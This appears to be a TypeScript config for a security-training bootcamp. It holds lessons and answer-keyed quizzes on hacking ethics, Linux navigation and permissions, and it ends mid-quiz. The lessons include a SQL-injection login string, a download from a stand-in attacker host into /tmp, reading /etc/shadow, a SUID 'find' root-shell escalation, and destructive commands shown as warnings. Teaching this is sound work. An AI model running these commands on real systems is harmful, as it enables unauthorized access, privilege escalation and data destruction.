/**
 * HACKER PROTOCOL BOOTCAMP — STATIC CONFIG
 * =========================================
 * Single source of truth for the bootcamp walkthrough structure.
 * MUST mirror the backend bootcamp.config.js exactly.
 *
 * Instruction format supports (GitHub-Flavored Markdown):
 *   - Fenced code blocks:  ```bash\ncommand\n```
 *   - Inline code:         `command`
 *   - Bold:                **text**
 *   - Italic:              *text*
 *   - Bold+Italic:         ***text***
 *   - Unordered lists:     - item
 *   - Ordered lists:       1. item
 *   - Headings:            # text
 *   - Blockquotes:         > text
 *   - Horizontal rule:     ---
 *   - Plain prose
 */
import type { QuizQuestion } from '@/features/student/data/courses/types';

export interface BootcampStep {
  title: string;
  instruction: string;
  /** Exact filename from the filesystem. null = no image yet → show placeholder. */
  image: string | null;
  /** Optional inline mini-quiz reinforcing this step's key concepts. */
  quiz?: QuizQuestion[];
}

export interface BootcampRoom {
  id: string;       // e.g. "room1"
  title: string;    // MUST match backend room title exactly (case-insensitive)
  overview: string;
  estimatedMinutes: number; // Estimated time to complete this room
  steps: BootcampStep[];
}

export interface BootcampPhase {
  id: string;       // e.g. "phase1"
  title: string;    // MUST match backend module title exactly (case-insensitive)
  codename: string;
  color?: string;   // hex color for this phase
  rooms: BootcampRoom[];
}

export interface BootcampConfig {
  id: string;
  title: string;
  phases: BootcampPhase[];
}

// ── Phase Colors ──────────────────────────────────────────────────────────────
export const PHASE_COLORS: Record<string, string> = {
  phase1: '#06B66F', // Green (Mindset)
  phase2: '#60A5FA', // Blue (Linux)
  phase3: '#A78BFA', // Purple (Networking)
  phase4: '#F59E0B', // Amber (Web)
  phase5: '#EF4444', // Red (Social)
};

// ── Config ────────────────────────────────────────────────────────────────────
export const BOOTCAMP_CONFIG: BootcampConfig = {
  id: 'hpb',
  title: 'Hacker Protocol Bootcamp',
  phases: [

    // ── PHASE 1: HACKER MINDSET (moduleId: 1, 3 rooms) ──────────────────────
    {
      id: 'phase1',
      title: 'Hacker Mindset',
      codename: 'PHASE 1',
      color: PHASE_COLORS.phase1,
      rooms: [
        {
          id: 'room1',
          title: 'Introduction to Offensive Security',
          overview:
            'Offensive security is the practice of thinking and acting like an attacker: with permission, to find weaknesses before real adversaries do. This room explains what the field is, why it exists, and how QYVORA fits into it.',
          estimatedMinutes: 20,
          steps: [
            {
              title: 'What is Offensive Security?',
              instruction: `Offensive security means finding weaknesses before attackers do. You test systems with permission to help make them safer.

**Two sides of security:**

- **Defensive Security**: Building walls, firewalls, and defenses
- **Offensive Security**: Testing those defenses by thinking like an attacker

Think of it like hiring someone to test your locks before a burglar does.

**Common job roles:**

- Penetration Tester (Pentester)
- Security Researcher
- Red Team Operator
- Bug Bounty Hunter

> All of these require written permission before testing any system.`,
              image: null,
              quiz: [
                {
                  id: 'p1r1-q1',
                  question: 'What must you have before testing any system?',
                  options: ['The latest tools', 'Written permission', 'A VPN connection', 'Kali Linux installed'],
                  correctIndex: 1,
                  explanation: 'Written permission (authorization) is legally required before testing any system. Testing without permission is illegal hacking.'
                }
              ]
            },
            {
              title: 'The Testing Process',
              instruction: `Every security test follows basic steps:

**1. Get Authorization**
Sign a contract that says exactly what you can test.

**2. Reconnaissance**
Gather information about the target system.

**3. Find Vulnerabilities**
Look for weaknesses in the system.

**4. Exploit**
Prove the weakness is real by exploiting it safely.

**5. Report**
Write a clear report explaining what you found and how to fix it.

**Simple example:**

\`\`\`bash
# Step 2: Reconnaissance - scan for open ports
nmap target.com

# Step 3: Find vulnerabilities - see what's running
nmap -sV target.com

# Step 4: Exploit (with permission!)
# Use the found vulnerability to prove impact
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p1r1-q2',
                  question: 'What is the first step in any security test?',
                  options: ['Scanning the network', 'Getting authorization', 'Installing tools', 'Exploiting vulnerabilities'],
                  correctIndex: 1,
                  explanation: 'Authorization must always come first. Without it, you are breaking the law.'
                }
              ]
            },
            {
              title: 'Why Companies Hire Hackers',
              instruction: `Companies pay security professionals to break their systems because:

**Prevention is cheaper than damage**

A data breach can cost millions. Hiring testers costs thousands.

**Real-world example:**

\`\`\`
Cost of a data breach: $4.5 million average
Cost of a penetration test: $10,000-50,000
\`\`\`

**What companies want to know:**

- Can an attacker get in?
- What damage could they cause?
- How do we fix it?

**Your job as a tester:**

Test like a real attacker would, but:
- With permission
- Without causing damage
- Document everything
- Help them fix issues`,
              image: null,
            },
            {
              title: 'QYVORA Training Approach',
              instruction: `QYVORA trains you by letting you:

**Practice safely**
All targets in this platform are designed to be hacked.

**Learn progressively**
Start simple, build to advanced skills.

**Get hands-on**
No theory-only lessons. You'll actually do the hacking.

**What you'll learn:**

\`\`\`
Phase 1: Mindset & Ethics
Phase 2: Linux Skills
Phase 3: Networking
Phase 4: Web Security
Phase 5: Social Engineering
\`\`\`

**By the end:**
You'll understand how attackers think and how to find real vulnerabilities.

> Remember: Skills learned here should only be used legally and ethically.`,
              image: null,
              quiz: [
                {
                  id: 'p1r1-q3',
                  question: 'When can you use hacking skills learned on QYVORA?',
                  options: ['Anytime on any system', 'Only with written permission', 'Only on your own systems', 'Only during work hours'],
                  correctIndex: 1,
                  explanation: 'You need written permission before testing any system, even if you own it (your employer might still need to authorize testing).'
                }
              ]
            }
          ],
        },
        {
          id: 'room2',
          title: 'The Hacker Mindset',
          overview:
            'The most important tool you will ever develop is not a piece of software. It is how you think. This room breaks down the cognitive traits that separate effective operators from people who just run tools.',
          estimatedMinutes: 18,
          steps: [
            {
              title: 'Think Like an Attacker',
              instruction: `A hacker sees systems differently. Where others see a login page, a hacker sees:

**What the developer assumed:**
- Users will enter a username and password
- Users will click the login button
- Users won't try weird inputs

**What a hacker asks:**
- What if I send 1 million characters?
- What if I try special characters like \`'\` or \`"\`?
- What if I change the form action in my browser?

**Simple test:**

\`\`\`bash
# Normal user types: admin / password123
# Hacker tries: admin' OR '1'='1
\`\`\`

This is called **questioning assumptions**.`,
              image: null,
              quiz: [
                {
                  id: 'p1r2-q1',
                  question: 'What makes a hacker different from a regular user?',
                  options: ['More tools', 'Questions assumptions about how systems work', 'Faster typing', 'Better computer'],
                  correctIndex: 1,
                  explanation: 'Hackers question what developers assumed would happen and test edge cases that were never considered.'
                }
              ]
            },
            {
              title: 'Curiosity and Observation',
              instruction: `Good hackers are curious about how things work.

**When you see a website, ask:**

- Where does my password go when I click login?
- What happens behind the scenes?
- Are there hidden pages or features?

**Simple observation example:**

\`\`\`
Normal URL: website.com/user?id=100
Hacker notices: "What if I change 100 to 101?"
Result: You see someone else's profile!
\`\`\`

This is called **Insecure Direct Object Reference (IDOR)** - a common vulnerability.

**Practice observing:**
- URL patterns
- Error messages  
- Response times
- Hidden form fields

> Every detail tells you something about how the system works.`,
              image: null,
            },
            {
              title: 'Persistence and Patience',
              instruction: `Hacking is 90% failing and 10% succeeding.

**Reality of testing:**

\`\`\`
Attempt 1: Blocked by firewall
Attempt 2: Wrong payload format
Attempt 3: Still not working
...
Attempt 23: Success!
\`\`\`

**Why persistence matters:**

Most people give up after 2-3 tries. Hackers keep testing until they find a way.

**When something doesn't work:**

1. Read the error message carefully
2. Try a slightly different approach
3. Research the technology
4. Break the problem into smaller parts
5. Try again

**Example:**

\`\`\`bash
# First try - blocked
curl http://target.com/admin

# Second try - still blocked  
curl http://target.com/ADMIN

# Third try - works!
curl http://target.com/admin..
\`\`\`

Small changes make big differences.`,
              image: null,
              quiz: [
                {
                  id: 'p1r2-q2',
                  question: 'What should you do when your first hacking attempt fails?',
                  options: ['Give up', 'Try a different approach', 'Use more tools', 'Hack a different target'],
                  correctIndex: 1,
                  explanation: 'Persistence is key. Most hacking attempts fail at first. Adjust your approach and keep testing.'
                }
              ]
            },
            {
              title: 'Document Everything',
              instruction: `Always write down what you find.

**Why documentation matters:**

You'll test hundreds of things. Without notes, you'll forget what worked.

**What to document:**

\`\`\`bash
# Keep a simple log
echo "Tested SQL injection on login - VULNERABLE" >> notes.txt
echo "Tried XSS on search - NOT VULNERABLE" >> notes.txt
echo "Found exposed API at /api/users - VULNERABLE" >> notes.txt
\`\`\`

**Document with screenshots:**

\`\`\`bash
# Take screenshots of findings
screenshot vulnerable-page.png
\`\`\`

**Why this helps:**

1. Remember what you did
2. Prove findings to clients
3. Write better reports
4. Learn from mistakes

> Professional testers spend as much time documenting as testing.`,
              image: null,
            },
            {
              title: 'Learn Continuously',
              instruction: `Technology changes fast. Hackers never stop learning.

**How to keep learning:**

**Follow security researchers:**
- Twitter/X security community
- Security blogs
- YouTube channels

**Practice regularly:**

\`\`\`bash
# Try new tools
apt install new-security-tool
new-security-tool --help

# Read documentation  
man nmap

# Practice on legal platforms
# - QYVORA (this platform)
# - HackTheBox
# - TryHackMe
\`\`\`

**Learn from failures:**

Every blocked attempt teaches you:
- How defenses work
- What to try next
- How to bypass similar blocks

**Growth mindset:**
"I can't do this *yet*" vs "I can't do this"

> The best hackers are always learning new techniques.`,
              image: null,
              quiz: [
                {
                  id: 'p1r2-q3',
                  question: 'Why do hackers need to keep learning?',
                  options: ['To show off', 'Because technology and defenses constantly change', 'To get certifications', 'To use more tools'],
                  correctIndex: 1,
                  explanation: 'Technology evolves constantly. New vulnerabilities are discovered, and new defenses are built. Continuous learning is essential.'
                }
              ]
            }
          ],
        },
        {
          id: 'room3',
          title: 'Ethics & Legal Boundaries',
          overview:
            'Operating without authorisation is a criminal offence in every jurisdiction. This room covers the legal framework, the concept of scope, and responsible disclosure: the non-negotiable foundations of professional offensive security.',
          estimatedMinutes: 22,
          steps: [
            {
              title: 'The Law is Clear',
              instruction: `Unauthorized hacking is a crime everywhere.

**United States:**
- Computer Fraud and Abuse Act (CFAA)
- Penalties: Up to 20 years in prison

**United Kingdom:**
- Computer Misuse Act
- Penalties: Up to 10 years in prison

**European Union:**
- Various national laws
- Similar severe penalties

**What counts as unauthorized access:**

\`\`\`
❌ Testing a website without permission
❌ Accessing someone's account without consent
❌ Scanning networks you don't own
❌ Using vulnerabilities to "test" real systems
\`\`\`

**Always required:**

\`\`\`
✅ Written contract
✅ Defined scope
✅ Emergency contact
✅ Rules of engagement
\`\`\`

> "I was just testing" is not a legal defense.`,
              image: null,
              quiz: [
                {
                  id: 'p1r3-q1',
                  question: 'Can you test a website without permission if you find a vulnerability and plan to report it?',
                  options: ['Yes, if you report it afterwards', 'No, unauthorized testing is always illegal', 'Yes, if you do not cause damage', 'Yes, if the website is public'],
                  correctIndex: 1,
                  explanation: 'Unauthorized access is illegal regardless of your intentions. Always get written permission first, even for responsible disclosure.'
                }
              ]
            },
            {
              title: 'Understanding Scope',
              instruction: `Scope defines exactly what you can and cannot test.

**A typical scope document:**

\`\`\`
IN SCOPE:
- website.com
- api.website.com  
- app.website.com

OUT OF SCOPE:
- partner-site.com (owned by different company)
- payment.website.com (handled by third party)
- Any physical access attempts
\`\`\`

**Why scope matters:**

Testing out-of-scope targets is the same as unauthorized hacking.

**Example of staying in scope:**

\`\`\`bash
# ✅ Allowed: Scanning in-scope domain
nmap website.com

# ❌ NOT allowed: Following link to partner site
# Found link to partner-site.com but it's out of scope
# DO NOT test it!
\`\`\`

**When in doubt:**

Contact the client and ask. Never assume.`,
              image: null,
              quiz: [
                {
                  id: 'p1r3-q2',
                  question: 'You find a link from an in-scope website to a partner website. Can you test the partner site?',
                  options: ['Yes, it was linked from the in-scope site', 'No, only test what is explicitly in scope', 'Yes, if it looks vulnerable', 'Yes, if you find the link in testing'],
                  correctIndex: 1,
                  explanation: 'Only test systems explicitly listed in scope. Links to other systems do not grant permission to test them.'
                }
              ]
            },
            {
              title: 'Professional Ethics',
              instruction: `Being ethical means more than following the law.

**Core principles:**

**1. Do No Harm**
\`\`\`bash
# ✅ Read database to prove vulnerability
SELECT * FROM users LIMIT 5;

# ❌ Delete database 
DROP DATABASE users; # NEVER DO THIS
\`\`\`

**2. Respect Privacy**

If you find personal data, don't:
- Share it
- Copy more than needed
- Read unnecessary details

**3. Be Honest**

\`\`\`
✅ "I found 5 vulnerabilities"
❌ "I found 5 critical vulnerabilities" (when they're actually minor)
\`\`\`

Don't exaggerate to make findings seem worse.

**4. Maintain Confidentiality**

Client data stays private:
- Don't tweet about findings
- Don't share company names  
- Don't discuss details publicly

> Trust is everything in security. Break it once, lose it forever.`,
              image: null,
            },
            {
              title: 'Responsible Disclosure',
              instruction: `When you find a vulnerability, report it properly.

**Good disclosure process:**

**1. Report to the company first**

\`\`\`
Email: security@company.com
Subject: Security Vulnerability Report
Include: Clear description and proof
\`\`\`

**2. Give them time to fix**

Typical: 90 days before public disclosure

**3. Don't weaponize or sell**

- Don't create exploits for others
- Don't sell to malicious actors
- Don't post full exploits immediately

**Example responsible disclosure:**

\`\`\`
Day 1: Email company with details
Day 7: Company confirms receipt
Day 30: Company provides fix timeline  
Day 90: Fix is deployed
Day 91: You can publicly discuss (if desired)
\`\`\`

**Bug bounty programs:**

Many companies pay for findings:

\`\`\`bash
# Check if company has a program
https://company.com/.well-known/security.txt
\`\`\`

Follow their specific rules.`,
              image: null,
              quiz: [
                {
                  id: 'p1r3-q3',
                  question: 'How long should you typically wait before publicly disclosing a vulnerability?',
                  options: ['Immediately', '7 days', '90 days', '1 year'],
                  correctIndex: 2,
                  explanation: '90 days is the industry standard for responsible disclosure, giving companies time to fix issues before public disclosure.'
                }
              ]
            },
            {
              title: 'When Things Go Wrong',
              instruction: `Mistakes happen. What matters is how you handle them.

**If you accidentally:**

**Access out-of-scope systems:**

\`\`\`
1. Stop immediately
2. Document what happened
3. Inform client right away
4. Do not access again
\`\`\`

**Cause unintended impact:**

\`\`\`bash
# Example: Your scan crashed a service
1. Stop the scan
2. Contact client emergency line
3. Provide full details
4. Help fix if possible
\`\`\`

**Find illegal content:**

\`\`\`
1. Stop investigation
2. Contact client legal team
3. Document minimal details
4. Follow legal guidance
\`\`\`

**Professional response:**

Being honest about mistakes builds trust. Hiding them destroys your reputation and can lead to legal issues.

**Remember:**

Good judgment comes from experience. Experience comes from bad judgment. Learn from every mistake.

> Your ethics define your career. Protect them.`,
              image: null,
              quiz: [
                {
                  id: 'p1r3-q4',
                  question: 'What should you do if you accidentally cause a system crash during testing?',
                  options: ['Continue testing other systems', 'Hide the evidence', 'Immediately stop and contact the client', 'Fix it yourself without telling anyone'],
                  correctIndex: 2,
                  explanation: 'Transparency is critical. Immediately stop, contact the client, and help resolve the issue. Hiding mistakes is unethical and unprofessional.'
                }
              ]
            }
          ],
        }],
    },

    // ── PHASE 2: LINUX FOUNDATIONS (moduleId: 2, 4 rooms) ───────────────────
    {
      id: 'phase2',
      title: 'Linux Foundations',
      codename: 'PHASE 2',
      color: PHASE_COLORS.phase2,
      rooms: [
        {
          id: 'room1',
          title: 'Linux Basics & Navigation',
          overview:
            "To become an Qyvora Hacker, you must first master the environment where we live: the Linux terminal. This isn't just about typing commands; it's about learning the language of the machine. In this room, you will transition from a curious observer to a skilled operator, building the 'muscle memory' required for high-stakes engagements.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'Why Learn Linux?',
              instruction: `Most servers, hacking tools, and security systems run on Linux.

**Why hackers use Linux:**

- Most hacking tools are built for Linux
- Servers typically run Linux
- Full control over the system
- Free and open source

**Common Linux distributions:**

\`\`\`bash
# Security-focused
Kali Linux    # Pre-loaded with hacking tools
Parrot OS     # Similar to Kali

# General purpose
Ubuntu        # Beginner friendly
Debian        # Stable and reliable
\`\`\`

**The terminal is your home:**

When you compromise a server, you won't have a desktop. Just a terminal prompt:

\`\`\`bash
user@target:~$
\`\`\`

This is where all your work happens.`,
              image: null,
              quiz: [
                {
                  id: 'p2r1-q1',
                  question: 'Why do hackers prefer Linux?',
                  options: ['It looks cool', 'Most hacking tools and servers run on Linux', 'It is faster than Windows', 'It has better games'],
                  correctIndex: 1,
                  explanation: 'Linux is the standard for security work because most tools are built for it and most servers run it.'
                },
                {
                  id: 'p2r1-q1a',
                  question: 'You are hired to test a company\'s web server. Which operating system is it most likely running?',
                  options: [
                    'Linux, because most servers run it',
                    'Windows 95',
                    'A phone operating system',
                    'A game console system'
                  ],
                  correctIndex: 0,
                  explanation: 'Most servers on the internet run Linux. If you want to test them, you need to be comfortable working inside Linux, usually from the terminal, because many servers have no desktop at all.'
                },
                {
                  id: 'p2r1-q1b',
                  question: 'What is Kali Linux?',
                  options: [
                    'A website for practicing hacking',
                    'A Linux system that comes with many security and hacking tools already installed',
                    'A single password-cracking program',
                    'A type of firewall'
                  ],
                  correctIndex: 1,
                  explanation: 'Kali is a version of Linux built for security work. It saves you from installing hundreds of tools by hand. Ubuntu is a popular general-purpose Linux, but Kali is the one made for testing.'
                }
              ]
            },
            {
              title: 'Basic Commands',
              instruction: `Learn these essential commands first.

**See where you are:**

\`\`\`bash
pwd
# Output: /home/user
\`\`\`

**List files:**

\`\`\`bash
ls          # List files
ls -l       # Detailed list
ls -la      # Include hidden files
\`\`\`

**Change directory:**

\`\`\`bash
cd Documents        # Go to Documents
cd ..              # Go up one level
cd ~               # Go to home directory
cd /               # Go to root
\`\`\`

**Create and view files:**

\`\`\`bash
touch file.txt     # Create empty file
cat file.txt       # View file contents
echo "text" > file.txt    # Write to file
\`\`\`

> Practice these until they become automatic. You'll use them constantly.`,
              image: null,
              quiz: [
                {
                  id: 'p2r1-q2',
                  question: 'What does "cd .." do?',
                  options: ['Creates a directory', 'Goes up one directory level', 'Lists all files', 'Deletes a directory'],
                  correctIndex: 1,
                  explanation: 'The ".." means "parent directory", so "cd .." moves up one level in the directory tree.'
                },
                {
                  id: 'p2r1-q2a',
                  question: 'You are in /home/alex and want to move into the folder called tools. Which command do you use?',
                  options: [
                    'ls tools',
                    'touch tools',
                    'cd tools',
                    'pwd tools'
                  ],
                  correctIndex: 2,
                  explanation: 'cd (change directory) moves you into a folder. ls only lists what is inside it, touch would create an empty file named tools, and pwd only shows where you are. Use pwd any time you feel lost.'
                },
                {
                  id: 'p2r1-q2b',
                  question: 'You want to read what is inside notes.txt. Which command shows its contents on the screen?',
                  options: [
                    'touch notes.txt',
                    'ls notes.txt',
                    'cd notes.txt',
                    'cat notes.txt'
                  ],
                  correctIndex: 3,
                  explanation: 'cat prints the contents of a file. touch creates a file (or updates its time), ls notes.txt only shows that the file exists, and cd only works on folders. You will use cat all the time to read config files and logs.'
                }
              ]
            },
            {
              title: 'File System Structure',
              instruction: `Linux organizes everything under one root directory: \`/\`

**Important directories:**

\`\`\`
/home       # User home directories
/etc        # Configuration files
/var/log    # Log files
/tmp        # Temporary files (world-writable)
/usr/bin    # User programs
/root       # Root user's home
\`\`\`

**Why these matter for hacking:**

\`\`\`bash
# Look for passwords in configs
cat /etc/passwd

# Check logs for authentication attempts
cat /var/log/auth.log

# Stage your tools in tmp
cd /tmp
wget http://attacker.com/tool.sh
\`\`\`

**Absolute vs Relative paths:**

\`\`\`bash
# Absolute (starts with /)
cd /home/user/Documents

# Relative (from current location)
cd Documents
\`\`\``,
              image: null,
            },
            {
              title: 'Working with Files',
              instruction: `Essential file operations.

**Copy files:**

\`\`\`bash
cp file.txt backup.txt          # Copy
cp -r folder1 folder2           # Copy directory
\`\`\`

**Move/Rename:**

\`\`\`bash
mv old.txt new.txt              # Rename
mv file.txt /tmp/               # Move to /tmp
\`\`\`

**Delete files:**

\`\`\`bash
rm file.txt                     # Delete file
rm -r folder                    # Delete directory
rm -rf folder                   # Force delete (dangerous!)
\`\`\`

**Create directories:**

\`\`\`bash
mkdir newfolder                 # Create one directory
mkdir -p path/to/nested/dir     # Create nested directories
\`\`\`

**⚠️ Important:**

\`\`\`bash
# ❌ NEVER run this
rm -rf /

# It deletes everything on the system!
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p2r1-q3',
                  question: 'What is the difference between "rm" and "rm -rf"?',
                  options: ['"rm" deletes files, "rm -rf" force-deletes directories recursively', 'They are the same', '"rm -rf" is safer', '"rm" is for directories only'],
                  correctIndex: 0,
                  explanation: '"rm" removes files. The -r flag makes it recursive (directories), and -f forces deletion without confirmation. Use with caution!'
                },
                {
                  id: 'p2r1-q3a',
                  question: "You want to check system logs for signs of suspicious activity. Which directory should you look in?",
                  options: [
                    "/var/log",
                    "/tmp",
                    "/usr/bin",
                    "/root"
                  ],
                  correctIndex: 0,
                  explanation: "/var/log is where Linux and its services write their logs. Logs show logins, errors and other events, so they help you see what happened on a system. /tmp is for temporary files, /usr/bin holds programs, and /root is the root user's home."
                },
                {
                  id: 'p2r1-q3b',
                  question: "You want to find the file that lists user accounts. Which directory holds it?",
                  options: [
                    "/tmp",
                    "/etc (the file is /etc/passwd)",
                    "/var/log",
                    "/home"
                  ],
                  correctIndex: 1,
                  explanation: "/etc stores system configuration files, including /etc/passwd, which lists the accounts on the machine. When you land on a new Linux system, /etc is one of the first places to look."
                }
              ]
            },
            {
              title: 'Getting Help',
              instruction: `Every command has a manual.

**Read command documentation:**

\`\`\`bash
man ls          # Manual for ls command
man nmap        # Manual for nmap
\`\`\`

**Quick help:**

\`\`\`bash
ls --help       # Quick help for ls
nmap -h         # Help flag
\`\`\`

**Search for commands:**

\`\`\`bash
apropos search  # Find commands related to "search"
which nmap      # Show where nmap is installed
\`\`\`

**Navigate man pages:**

\`\`\`
Space    # Next page
b        # Previous page
/word    # Search for "word"
q        # Quit
\`\`\`

**Example:**

\`\`\`bash
# Don't know how to use grep?
man grep

# Quick syntax reminder
grep --help
\`\`\`

> Good hackers read documentation. Always check the manual when learning a new tool.`,
              image: null,
            },
            {
              title: 'Pipes and Redirection',
              instruction: `Chain commands together for powerful results.

**Redirect output to file:**

\`\`\`bash
ls > files.txt              # Save output to file (overwrite)
ls >> files.txt             # Append to file
\`\`\`

**Pipe output to another command:**

\`\`\`bash
ls -la | grep ".txt"        # List only .txt files
cat file.txt | wc -l        # Count lines in file
ps aux | grep "apache"      # Find apache processes
\`\`\`

**Practical examples:**

\`\`\`bash
# Save nmap scan to file
nmap target.com > scan.txt

# Find open ports from scan
cat scan.txt | grep "open"

# Count how many open ports
cat scan.txt | grep "open" | wc -l
\`\`\`

**Chain multiple commands:**

\`\`\`bash
# Extract IPs from log file, sort, remove duplicates
cat access.log | grep "Failed" | cut -d' ' -f1 | sort | uniq
\`\`\`

> Mastering pipes makes you 10x more efficient.`,
              image: null,
              quiz: [
                {
                  id: 'p2r1-q4',
                  question: 'What does the pipe "|" character do?',
                  options: ['Deletes output', 'Sends output from one command as input to another', 'Saves to file', 'Combines files'],
                  correctIndex: 1,
                  explanation: 'The pipe "|" takes the output of one command and passes it as input to the next command, letting you chain operations.'
                },
                {
                  id: 'p2r1-q4a',
                  question: "Why is the command rm -rf so dangerous?",
                  options: [
                    "It only deletes hidden files",
                    "It asks you to confirm every file",
                    "It deletes files and folders for good, with no confirmation and no recycle bin",
                    "It moves files to a trash folder you can restore"
                  ],
                  correctIndex: 2,
                  explanation: "Linux has no undo for rm. The -r flag goes through folders and -f forces it without asking. One typo, such as a wrong path, can wipe out important data, so always double-check before pressing Enter."
                },
                {
                  id: 'p2r1-q4b',
                  question: "You want to rename report.txt to final.txt. Which command does it?",
                  options: [
                    "cp report.txt final.txt",
                    "rm report.txt final.txt",
                    "mkdir final.txt",
                    "mv report.txt final.txt"
                  ],
                  correctIndex: 3,
                  explanation: "mv moves a file, and moving it to a new name in the same place is how you rename it. cp makes a copy and leaves the original, rm deletes, and mkdir creates a folder instead."
                }
              ]
            }
          ],
        },
        {
          id: 'room2',
          title: 'Users, Groups & Permissions',
          overview:
            "Identity is the cornerstone of security. In this room, you'll learn how Linux identifies who is a friend and who is a potential intruder. By mastering user accounts, shadow files, and privilege escalation pathways, you will learn to navigate the Qyvora network like a ghost in the machine.",
          estimatedMinutes: 30,
          steps: [
            {
              title: 'Users and Groups',
              instruction: `Linux has different types of users with different privileges.

**User types:**

\`\`\`bash
root        # Superuser (can do anything)
user        # Regular user (limited access)
service     # System accounts (run services)
\`\`\`

**Check current user:**

\`\`\`bash
whoami      # Show current username
id          # Show user ID and groups
\`\`\`

**View all users:**

\`\`\`bash
cat /etc/passwd     # List all users
# Format: username:x:uid:gid:info:home:shell
\`\`\`

**Groups:**

Users belong to groups for shared permissions.

\`\`\`bash
groups              # Show your groups
cat /etc/group      # List all groups
\`\`\`

**Why this matters:**

When hacking, you need to know:
- What user am I?
- What can this user do?
- How do I become root?`,
              image: null,
              quiz: [
                {
                  id: 'p2r2-q1',
                  question: 'Which command shows your current username?',
                  options: ['user', 'whoami', 'name', 'getuser'],
                  correctIndex: 1,
                  explanation: '"whoami" displays the username of the current user. It is often the first command run after gaining access to a system.'
                },
                {
                  id: 'p2r2-q1a',
                  question: "You just got a shell on a Linux machine and want to know both who you are and which groups you belong to. Which command shows both?",
                  options: [
                    "id",
                    "whoami",
                    "pwd",
                    "ls -l"
                  ],
                  correctIndex: 0,
                  explanation: "id shows your user ID, your group ID and every group you are in. whoami only shows your username. Knowing your groups matters because group membership can give you access to files and tools."
                },
                {
                  id: 'p2r2-q1b',
                  question: "In /etc/passwd you see an account called www-data. What kind of account is it most likely?",
                  options: [
                    "A real person's account",
                    "A service account used to run the web server",
                    "The root user",
                    "A group of administrators"
                  ],
                  correctIndex: 1,
                  explanation: "Service accounts exist so programs like web servers run with limited rights instead of as root. They usually are not meant for people to log in with. If one is compromised, the attacker only gets that account's limited power."
                }
              ]
            },
            {
              title: 'File Permissions',
              instruction: `Every file has permissions that control who can access it.

**View permissions:**

\`\`\`bash
ls -l file.txt
# -rw-r--r--  1 user group  123 Nov 1 10:00 file.txt
\`\`\`

**Permission breakdown:**

\`\`\`
-rw-r--r--
│││││││││
│└┴┴┴┴┴┴┴ Other users' permissions
│ └┴┴ Group permissions
│  └┴┴ Owner permissions
└ File type (- = file, d = directory)

r = read (4)
w = write (2)
x = execute (1)
\`\`\`

**Examples:**

\`\`\`bash
-rw-r--r--  # Owner: read+write, Others: read only
-rwxr-xr-x  # Owner: full, Others: read+execute
-rw-------  # Owner: read+write, Others: nothing
drwxr-xr-x  # Directory with typical permissions
\`\`\`

**Change permissions:**

\`\`\`bash
chmod 755 script.sh     # rwxr-xr-x
chmod +x script.sh      # Add execute
chmod 600 secret.txt    # rw------- (owner only)
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p2r2-q2',
                  question: 'What does chmod 777 do?',
                  options: ['Deletes the file', 'Gives everyone full permissions (read, write, execute)', 'Makes file read-only', 'Hides the file'],
                  correctIndex: 1,
                  explanation: '777 means rwxrwxrwx - full permissions for owner, group, and everyone else. This is usually insecure!'
                },
                {
                  id: 'p2r2-q2a',
                  question: "A file shows -rw-r--r-- in ls -l. What can other users (everyone who is not the owner or in the group) do with it?",
                  options: [
                    "Read and write it",
                    "Read, write and execute it",
                    "Read it only",
                    "Nothing at all"
                  ],
                  correctIndex: 2,
                  explanation: "The permissions are split into three groups: owner (rw-), group (r--) and other (r--). Other users only have the r, which means read. Reading these strings quickly is a core skill when looking for files that are too open."
                },
                {
                  id: 'p2r2-q2b',
                  question: "Using r=4, w=2 and x=1, which number represents rw- (read and write only)?",
                  options: [
                    "4",
                    "5",
                    "6",
                    "7"
                  ],
                  correctIndex: 2,
                  explanation: "Add the values: read (4) plus write (2) equals 6. So rwxr-xr-x is 755 and rw-r--r-- is 644. Each digit in a chmod number stands for owner, group and other, in that order."
                }
              ]
            },
            {
              title: 'Sudo and Root Access',
              instruction: `Some commands require admin (root) privileges.

**Run command as root:**

\`\`\`bash
sudo command        # Run one command as root
sudo -i             # Become root user
\`\`\`

**Check sudo permissions:**

\`\`\`bash
sudo -l             # List what you can run with sudo
\`\`\`

**Example:**

\`\`\`bash
# ❌ Permission denied
cat /etc/shadow

# ✅ Works with sudo
sudo cat /etc/shadow
\`\`\`

**Why this matters for hacking:**

Many exploits require escalating from regular user to root.

\`\`\`bash
# Check if sudo has vulnerabilities
sudo -l

# Look for dangerous entries like:
(root) NOPASSWD: /usr/bin/find
# This means you can run find as root without password!
\`\`\`

> Finding ways to become root is called "privilege escalation".`,
              image: null,
            },
            {
              title: 'Finding SUID Binaries',
              instruction: `SUID (Set User ID) files run with owner's privileges, not yours.

**What is SUID?**

If a file owned by root has SUID set, it runs as root even when you execute it.

**Find SUID files:**

\`\`\`bash
find / -perm -4000 -type f 2>/dev/null
\`\`\`

**Example output:**

\`\`\`bash
/usr/bin/passwd     # Normal (needed to change passwords)
/usr/bin/sudo       # Normal
/usr/bin/find       # ⚠️ Dangerous if misconfigured!
\`\`\`

**Why this matters:**

SUID binaries are common privilege escalation vectors.

\`\`\`bash
# If find has SUID:
find . -exec /bin/bash -p \\;
# Now you're root!
\`\`\`

**Check file for SUID:**

\`\`\`bash
ls -l /usr/bin/passwd
-rwsr-xr-x  # The 's' means SUID is set
\`\`\`

> Always check for SUID files when trying to escalate privileges.`,
              image: null,
              quiz: [
                {
                  id: 'p2r2-q3',
                  question: 'Why are SUID binaries important for privilege escalation?',
                  options: ['They are faster', 'They run with the owner\'s privileges (often root)', 'They are hidden', 'They bypass firewalls'],
                  correctIndex: 1,
                  explanation: 'SUID files execute with the permissions of the file owner. If root owns an SUID file, you can potentially use it to run commands as root.'
                },
                {
                  id: 'p2r2-q3a',
                  question: "You got a shell as a regular user. Which command shows which commands you are allowed to run with sudo?",
                  options: [
                    "sudo -l",
                    "sudo -i",
                    "whoami",
                    "sudo ls /root"
                  ],
                  correctIndex: 0,
                  explanation: "sudo -l lists what your user is allowed to run as root. sudo -i is different: it actually opens a root shell, if you are allowed to. Checking sudo -l is usually one of the first steps when looking for a way up."
                },
                {
                  id: 'p2r2-q3b',
                  question: "Why is sudo -l useful when trying to escalate privileges?",
                  options: [
                    "It deletes the root password",
                    "It reveals commands you can run as root, which may give a path to full root access",
                    "It makes you root automatically",
                    "It lists every user on the system"
                  ],
                  correctIndex: 1,
